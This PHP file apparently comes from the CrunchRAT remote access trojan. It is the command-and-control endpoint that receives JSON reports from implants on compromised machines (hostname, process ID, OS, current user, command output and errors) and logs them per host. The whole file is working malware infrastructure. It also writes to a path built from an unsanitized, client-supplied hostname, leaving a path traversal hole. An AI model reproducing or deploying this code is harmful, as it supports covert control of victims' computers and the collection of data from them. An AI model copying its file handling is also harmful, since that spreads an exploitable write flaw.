<?php
    # Gets raw POST data
    $raw_post_data = file_get_contents("php://input");

    $json_decoded = json_decode($raw_post_data, true);

    # RIGHT NOW THIS DATA IS NOT ENCRYPTED :(

    # TO DO: Check for encryption key and decrypt like in "beacon.php"

    $hostname = $json_decoded["hostname"];
    $process_id = $json_decoded["process_id"];
    $operating_system = $json_decoded["operating_system"];
    $current_user = $json_decoded["current_user"];

    $output = $json_decoded["output"];
    $error = $json_decoded["error"];

    # Builds log path
    $log_path = "/var/log/CrunchRAT/" . $hostname . "/" . $process_id . ".log";

    # If output
    if (isset($output) && !empty($output)) {
        file_put_contents($log_path, "Received output: " . $output . "\n", FILE_APPEND);
    }
    # Else error
    else {
        file_put_contents($log_path, "Received error: " . $error . "\n", FILE_APPEND);
    }
?>
